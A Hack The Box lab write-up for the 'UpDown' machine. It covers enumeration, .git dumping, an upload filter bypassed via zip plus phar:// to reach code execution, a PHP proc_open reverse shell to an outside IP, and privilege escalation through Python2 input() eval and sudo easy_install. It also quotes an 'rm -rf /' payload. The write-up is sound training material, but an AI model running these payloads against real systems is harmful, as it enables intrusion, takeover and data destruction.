---
icon: ubuntu
---

# UpDown - Medium

<figure><img src="../../.gitbook/assets/image (3121).png" alt="" width="75"><figcaption><p><a href="https://www.hackthebox.com/machines/updown"><strong>UpDown</strong></a></p></figcaption></figure>

## <mark style="color:green;">Scanning & Enumeration</mark>

{% code title="Nmap TCP Scan" %}
```shellscript
nmap -A -T4 -p- -Pn 10.10.11.177 -oN scans/nmap-tcpall
Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-11 09:50 EST
Nmap scan report for siteisup.htb (10.10.11.177)
Host is up (0.041s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 9e:1f:98:d7:c8:ba:61:db:f1:49:66:9d:70:17:02:e7 (RSA)
|   256 c2:1c:fe:11:52:e3:d7:e5:f7:59:18:6b:68:45:3f:62 (ECDSA)
|_  256 5f:6e:12:67:0a:66:e8:e2:b7:61:be:c4:14:3a:d3:8e (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Is my Website up ?
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.19
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   27.55 ms 10.10.16.1
2   60.16 ms siteisup.htb (10.10.11.177)
```
{% endcode %}

### <mark style="color:blue;">HTTP Port 80 TCP</mark>

<figure><img src="../../.gitbook/assets/image (3122).png" alt=""><figcaption></figcaption></figure>

At the bottom of the site we see a domain name for the site I will add it to my `/etc/hosts` file

#### <mark style="color:$primary;">Tech Detection</mark>

```shellscript
curl -I http://siteisup.htb/
```

```shellscript
HTTP/1.1 200 OK
Date: Sun, 11 Jan 2026 15:22:31 GMT
Server: Apache/2.4.41 (Ubuntu)
Content-Type: text/html; charset=UTF-8
```

#### <mark style="color:$primary;">Virtual Host Enumeration</mark>

{% code overflow="wrap" %}
```shellscript
wfuzz -c -w ~/tools/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u 'http://siteisup.htb' -H 'HOST: FUZZ.siteisup.htb' --hw 93
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3123).png" alt=""><figcaption></figcaption></figure>

let's update our hosts file

{% code title="/etc/hosts" %}
```shellscript
10.10.11.177    siteisup.htb dev.siteisup.htb
```
{% endcode %}

#### <mark style="color:$primary;">**dev.siteisup.htb**</mark>

<figure><img src="../../.gitbook/assets/image (3087).png" alt=""><figcaption></figcaption></figure>

returns forbidden

#### <mark style="color:$primary;">Site Functinality</mark>

<figure><img src="../../.gitbook/assets/image (3088).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3089).png" alt=""><figcaption></figcaption></figure>

The site does reach back. I had the site grab a file to see if it runs it \[bash commands or html code] but it just outputs it back.

#### <mark style="color:$primary;">Directory Busting</mark>

```shellscript
feroxbuster -u http://siteisup.htb/dev
```

<figure><img src="../../.gitbook/assets/image (3090).png" alt=""><figcaption></figcaption></figure>

Were getting a redirect, let's further enumerate the endpoint.

{% code overflow="wrap" %}
```shellscript
feroxbuster -u http://siteisup.htb/dev -w ~/tools/SecLists/Discovery/Web-Content/raft-small-files.txt
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3091).png" alt=""><figcaption></figcaption></figure>

There is a git repo living here.&#x20;

#### <mark style="color:$primary;">Git Repo</mark>

I’ll use [git-dumper](https://github.com/arthaud/git-dumper) to collect the repo

```shellscript
python3 ~/tools/git-dumper/git_dumper.py http://siteisup.htb/dev/.git repo
```

<figure><img src="../../.gitbook/assets/image (3092).png" alt=""><figcaption></figcaption></figure>

New techniques in header to protect dev vhost sounds interesting!

<figure><img src="../../.gitbook/assets/image (3093).png" alt=""><figcaption></figcaption></figure>

The **`.htaccess`**&#x66;ile here is using the `Deny` and `Allow` directives to manage access to the site. It takes a top -> down approach to the rules.

The rules only allow users that have the `“Special-Dev": "only4dev"` parameter in their header

#### <mark style="color:$primary;">Set Header</mark>

I’ll use an extension like [Modify Header Value](https://addons.mozilla.org/en-US/firefox/addon/modify-header-value/) to set a the custom header

<figure><img src="../../.gitbook/assets/image (3095).png" alt=""><figcaption></figcaption></figure>

Don't forget to activate the extension for it to work! Now we should be able to see the site

<figure><img src="../../.gitbook/assets/image (3096).png" alt=""><figcaption></figcaption></figure>

We have upload functionality on this site, let's inspect the code in the git repo and see what we can do.

#### <mark style="color:$primary;">Source Code Analysis</mark>

<mark style="color:yellow;">**index.php**</mark>

```php
<b>This is only for developers</b>
<br>
<a href="?page=admin">Admin Panel</a>
<?php
	define("DIRECTACCESS",false);
	$page=$_GET['page'];
	if($page && !preg_match("/bin|usr|home|var|etc/i",$page)){
		include($_GET['page'] . ".php");
	}else{
		include("checker.php");
	}	
?>
```

`index.php` page has a link to `admin.php`, and also uses an `include` to load the main body of the page

`preg_match` is deny listing paths that might show up in a LFI attack. The `page` parameter has `.php` appended to it and that page is loaded and executed.

It also sets a variable, `DIRECTACCESS` to `false`. Found both in `admin.php` and `checker.php` that the page will only load if this is set to `false`, preventing direct access to those pages.

<mark style="color:yellow;">**admin.php**</mark>

```php
<?php
if(DIRECTACCESS){
	die("Access Denied");
}

#ToDo
?>
```

This page blocks access if accessed directly (rather than included from `index.php`)

<mark style="color:yellow;">**checker.php**</mark>

Contains form that takes in a file

```html
<form method="post" enctype="multipart/form-data">
			    <label>List of websites to check:</label><br><br>
				<input type="file" name="file" size="50">
				<input name="check" type="submit" value="Check">
</form>
```

Checks to see if the file is not to large, in a POST request

```php
if($_POST['check']){
  
	# File size must be less than 10kb.
	if ($_FILES['file']['size'] > 10000) {
        die("File too large!");
    }
	$file = $_FILES['file']['name'];
```

then it checks against a denylist of file extensions

{% code overflow="wrap" %}
```php
	# Check if extension is allowed.
	$ext = getExtension($file);
	if(preg_match("/php|php[0-9]|html|py|pl|phtml|zip|rar|gz|gzip|tar/i",$ext)){
		die("Extension not allowed!");
	}
```
{% endcode %}

Then it creates a directory from the hash of the current time in the `uploads` directory, and moves the file into that

```php
	# Create directory to upload our file.
	$dir = "uploads/".md5(time())."/";
	if(!is_dir($dir)){
        mkdir($dir, 0770, true);
    }
  
  # Upload the file.
	$final_path = $dir.$file;
	move_uploaded_file($_FILES['file']['tmp_name'], "{$final_path}");
```

uploaded file is deleted after uploading

```php
  # Delete the uploaded file.
	@unlink($final_path);
```

#### <mark style="color:$primary;">Testing Upload Functionality</mark>

<figure><img src="../../.gitbook/assets/image (3097).png" alt=""><figcaption></figcaption></figure>

The uploads endpoint has directory listing turned on

If I try uploading a simple file&#x20;

{% code title="test.txt" %}
```shellscript
google.com
10.10.16.3
0.0.0.0
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3100).png" alt=""><figcaption></figcaption></figure>

It doesn't take domain names, and there seems to be a 4th check?

If we go check the upload directory we will find the folder but it will be empty, because of the `unlink` at the end of the file

<figure><img src="../../.gitbook/assets/image (3098).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3099).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:$primary;">Uploading Zip File</mark>

When I upload a zip file, something crashes and the file doesn’t delete itself.

<figure><img src="../../.gitbook/assets/image (3101).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3102).png" alt=""><figcaption></figcaption></figure>

FYI a cron job cleans up the directories and files in `/uploads` every couple minutes

I'll use phpinfo to get information on which functions are allowed.

{% code title="info.php" %}
```php
<?php phpinfo(); ?>
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (3103).png" alt=""><figcaption></figcaption></figure>

I will use the  `phar://` wrapper to access the file inside of the zip archive: `phar://[archive path]/[file inside the archive]`

<figure><img src="../../.gitbook/assets/image (3104).png" alt=""><figcaption></figcaption></figure>

We have execution!

PHP is configured with many `disable_functions`

<figure><img src="../../.gitbook/assets/image (3105).png" alt=""><figcaption></figcaption></figure>

I'll save the phpinfo file and use dfunc-bypasser to check for allowed functions.

Save as -> phpinfo().php

```shellscript
python2 ~/tools/dfunc-bypasser/dfunc-bypasser.py --file 'phpinfo().info'
```

<figure><img src="../../.gitbook/assets/image (3106).png" alt=""><figcaption></figcaption></figure>

proc\_open has not been added to disable funcitons. We can use it to execute system commands

#### <mark style="color:$primary;">RCE via PHP proc\_open</mark>

[PHP docs](https://www.php.net/manual/en/function.proc-open.php) for -> `proc_open`

Found this [**repo**](https://gist.github.com/noobpk/33e4318c7533f32d6a7ce096bc0457b7#file-reverse-shell-php-L62) that shows how to get a reverse shell using `proc_open`

<figure><img src="../../.gitbook/assets/image (3108).png" alt=""><figcaption></figcaption></figure>

I’ll need to set `$shell` and `$descriptospec` variables. `$pipes` is not necessary since I’m just going to spawn a reverse shell, not try to read / write out of the process from PHP

{% code title="rev.php" overflow="wrap" %}
```php
<?php
        $descriptospec = array(
               0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
               1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
               2 => array("pipe", "w")   // stderr is a pipe that the child will write to
        );
        $cmd = "/bin/bash -c '/bin/bash -i >& /dev/tcp/10.10.16.3/80 0>&1'";
        $proc = proc_open($cmd, $descriptospec, $pipes);
?>
```
{% endcode %}

I'll prep a listener on port 80, zip the file, upload it and trigger it using the phar wrapper like earlier with php info

<figure><img src="../../.gitbook/assets/image (3110).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3112).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../.gitbook/assets/image (3113).png" alt=""><figcaption></figcaption></figure>

## <mark style="color:green;">Post Exploitation</mark>

### <mark style="color:blue;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (3114).png" alt=""><figcaption></figcaption></figure>

There is one more user besides root on the machine.

Found a python script and executable in `/home/developer/dev` directory

<figure><img src="../../.gitbook/assets/image (3115).png" alt=""><figcaption></figcaption></figure>

The executable has the SUID bit set, which means it will run as developer and not drop privileges.

<figure><img src="../../.gitbook/assets/image (3116).png" alt=""><figcaption></figcaption></figure>

{% code title="siteisup_test.py" %}
```python
import requests

url = input("Enter URL here:")
page = requests.get(url)
if page.status_code == 200:
        print "Website is up"
else:
        print "Website is down"
```
{% endcode %}

The print statement shows this is python2 code. Example:

{% code title="Python2 print statement" %}
```python
print "Hello"
print 1, 2, 3
```
{% endcode %}

{% code title="Python3 print statement" %}
```python
print("Hello")
print(1, 2, 3)
```
{% endcode %}

In Python2 the input call is a security risk because it **evaluates** whatever the user types as Python code. Example:

{% code title="Python2 Input example" %}
```python
x = input("Enter something: ")
```
{% endcode %}

If a user enters

```python
__import__('os').system('rm -rf /')
```

That code gets executed.&#x20;

Safe and Unsafe ->

* ❌ **Python 2:** `input()`  takes the input and passes it to `eval`, and my input isn’t valid python. I can pass it a one liner that will execute and get execution = <mark style="color:red;">**dangerous**</mark>
* ✅ **Python 2:** `raw_input()` = <mark style="color:green;">**safe**</mark>
* ✅ **Python 3:** `input()`  behaves like python2 raw\_input() (returns a string, no evaluation)= <mark style="color:green;">**safe**</mark>

<figure><img src="../../.gitbook/assets/image (3118).png" alt=""><figcaption></figcaption></figure>

#### <mark style="color:blue;">SUID Binary using Python2 input call -> privesc</mark>

<figure><img src="../../.gitbook/assets/image (3119).png" alt=""><figcaption></figcaption></figure>

The Binary behaves and crashes the same as the python2 script

Running strings on the applications shows why (Because it is calling the Python2 script)

<figure><img src="../../.gitbook/assets/image (3120).png" alt=""><figcaption></figcaption></figure>

Let's escalate privileges to developer, since the executable has the SUID bit set all we need to do is call bash:

```python
__import__('os').system('bash')
```

<figure><img src="../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">Shell as developer</mark>

I'll grab the ssh key for ease of access and a better shell

<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```shellscript
vi developer_id_rsa
chmod 600 developer_id_rsa
ssh -i developer_id_rsa developer@siteisup.htb
```

<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

### <mark style="color:blue;">Manual Enumeration</mark>

<figure><img src="../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

developer can run `easy_install` as root without a password

### <mark style="color:blue;">SUDO easy\_install privesc</mark>

`easy_install` is a deprecated way to install packages in Python. It runs a `setup.py` script which takes certain actions to install the package.

[GTFOBins](https://gtfobins.github.io/gtfobins/easy_install/#sudo) has an easy privesc

<figure><img src="../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

It takes a url I can host a malicious script on my machine and fetch it

It can also take a directory, i'll try it this way

{% code title="Commands to run" %}
```shellscript
mkdir deimos
cd deimos
echo -e 'import os\n\nos.system("/bin/bash")' > setup.py
sudo easy_install /dev/shm/deimos/
```
{% endcode %}

<figure><img src="../../.gitbook/assets/image (5) (1) (1).png" alt=""><figcaption></figcaption></figure>

